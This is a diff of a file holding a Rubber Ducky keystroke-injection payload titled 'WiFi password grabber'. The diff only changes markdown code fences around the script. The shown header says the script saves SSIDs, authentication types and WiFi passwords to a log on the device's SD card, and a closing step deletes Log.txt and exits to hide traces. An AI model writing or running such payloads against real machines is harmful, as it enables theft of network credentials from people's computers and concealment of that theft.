@@ -1,4 +1,5 @@
-`REM Title: WiFi password grabber save to twin duck SD
+```
+REM Title: WiFi password grabber save to twin duck SD
 REM Author: silent_noise
 REM Original by: Siem
 REM Description: Saves the SSID, Network type, Authentication and the password to Log.txt. Then saves to the CD card on the twin duck
@@ -70,7 +71,8 @@ ENTER
 DELAY 500
 REM --> Delete Log.txt and exit
 STRING del Log.txt & exit
-ENTER`
+ENTER
+```
 
 
 
